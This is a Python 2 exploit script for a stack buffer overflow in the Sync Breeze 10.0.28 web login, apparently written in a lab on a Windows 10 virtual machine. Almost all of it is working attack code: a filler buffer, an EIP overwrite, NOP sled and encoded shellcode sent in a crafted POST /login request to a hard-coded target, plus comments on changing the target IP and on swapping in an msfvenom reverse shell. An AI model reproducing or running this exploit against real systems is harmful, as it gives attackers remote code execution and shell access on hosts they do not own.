#!/usr/bin/python

# Buffer this is an exploit to run against synbreeze version 10.0.28 on a windows 10 machine. 

import socket

# replace this code with MSFVENOM Reverse shell 

try:
    print "\nSending evil buffer..."

    shellcode = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x9c\x94\xb5\xe5\x83\xee\xfc\xe2\xf4\x60\x7c\x37\xe5\x9c\x94"
"\xd5\x6c\x79\xa5\x75\x81\x17\xc4\x85\x6e\xce\x98\x3e\xb7\x88"
"\x1f\xc7\xcd\x93\x23\xff\xc3\xad\x6b\x19\xd9\xfd\xe8\xb7\xc9"
"\xbc\x55\x7a\xe8\x9d\x53\x57\x17\xce\xc3\x3e\xb7\x8c\x1f\xff"
"\xd9\x17\xd8\xa4\x9d\x7f\xdc\xb4\x34\xcd\x1f\xec\xc5\x9d\x47"
"\x3e\xac\x84\x77\x8f\xac\x17\xa0\x3e\xe4\x4a\xa5\x4a\x49\x5d"
"\x5b\xb8\xe4\x5b\xac\x55\x90\x6a\x97\xc8\x1d\xa7\xe9\x91\x90"
"\x78\xcc\x3e\xbd\xb8\x95\x66\x83\x17\x98\xfe\x6e\xc4\x88\xb4"
"\x36\x17\x90\x3e\xe4\x4c\x1d\xf1\xc1\xb8\xcf\xee\x84\xc5\xce"
"\xe4\x1a\x7c\xcb\xea\xbf\x17\x86\x5e\x68\xc1\xfc\x86\xd7\x9c"
"\x94\xdd\x92\xef\xa6\xea\xb1\xf4\xd8\xc2\xc3\x9b\x6b\x60\x5d"
"\x0c\x95\xb5\xe5\xb5\x50\xe1\xb5\xf4\xbd\x35\x8e\x9c\x6b\x60"
"\xb5\xcc\xc4\xe5\xa5\xcc\xd4\xe5\x8d\x76\x9b\x6a\x05\x63\x41"
"\x22\x8f\x99\xfc\x75\x4d\xeb\x53\xdd\xe7\x9c\x95\x0e\x6c\x7a"
"\xfe\xa5\xb3\xcb\xfc\x2c\x40\xe8\xf5\x4a\x30\x19\x54\xc1\xe9"
"\x63\xda\xbd\x90\x70\xfc\x45\x50\x3e\xc2\x4a\x30\xf4\xf7\xd8"
"\x81\x9c\x1d\x56\xb2\xcb\xc3\x84\x13\xf6\x86\xec\xb3\x7e\x69"
"\xd3\x22\xd8\xb0\x89\xe4\x9d\x19\xf1\xc1\x8c\x52\xb5\xa1\xc8"
"\xc4\xe3\xb3\xca\xd2\xe3\xab\xca\xc2\xe6\xb3\xf4\xed\x79\xda"
"\x1a\x6b\x60\x6c\x7c\xda\xe3\xa3\x63\xa4\xdd\xed\x1b\x89\xd5"
"\x1a\x49\x2f\x55\xf8\xb6\x9e\xdd\x43\x09\x29\x28\x1a\x49\xa8"
"\xb3\x99\x96\x14\x4e\x05\xe9\x91\x0e\xa2\x8f\xe6\xda\x8f\x9c"
"\xc7\x4a\x30")

# Buffer has been made against a windows 10 VM. 

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10

    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    
# Change IP Address of Target line 48, 52 and 65. also make sure the login Path is correct if not default. 

    buffer += "Host: 192.168.199.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n" 
    buffer += "Referer: http://192.168.199.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
 # Change the IP of Target here too. 

    s.connect(("192.168.199.10", 80))
    s.send(buffer)
    
    s.close()

    print "\nDone!"
except:
    print "\nCould not connect!"
